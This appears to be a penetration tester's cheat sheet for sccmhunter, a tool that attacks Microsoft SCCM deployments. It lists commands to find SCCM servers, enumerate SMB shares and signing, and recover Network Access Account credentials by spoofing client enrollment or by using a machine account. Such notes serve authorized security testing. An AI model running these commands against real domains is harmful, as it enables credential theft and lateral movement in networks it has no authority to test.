### Source
https://github.com/garrettfoster13/sccmhunter

### Find SCCM server
```
python3 sccmhunter.py find -u <user> -p "<password>" -d <domain> -dc-ip <domainController>
```

### Enumerate SMB shares and check SMB signing and MSSQL service for found servers
```
python3 sccmhunter.py smb -u <user> -p "<password>" -d <domain> -dc-ip <domainController>
```

### Show results of previous scans
```
python3 sccmhunter.py show -all
```

### Possible values for show results
```
-siteservers
-mps
-users
-computers
-groups
-creds
```

### Spoof standard client enrollment to recover NAA credentials (need ms-DS-MachineAccountQuota != 0)
```
python3 sccmhunter.py http -u <user> -p <password> -d <domain> -dc-ip <domainController> -auto
```

### Use existing machine account to recover NAA credentials
```
python3 sccmhunter.py http -u <user> -p <password> -d <domain> -dc-ip <domainController> -cn '<computerAccount$>' -cp <computerPassword>
```

### Request policy
```
python3 sccmhunter.py http -u <user> -p <password> -d <domain> -dc-ip <domainController> -mp <managmentPointRhost> -uuid <uuid>
```

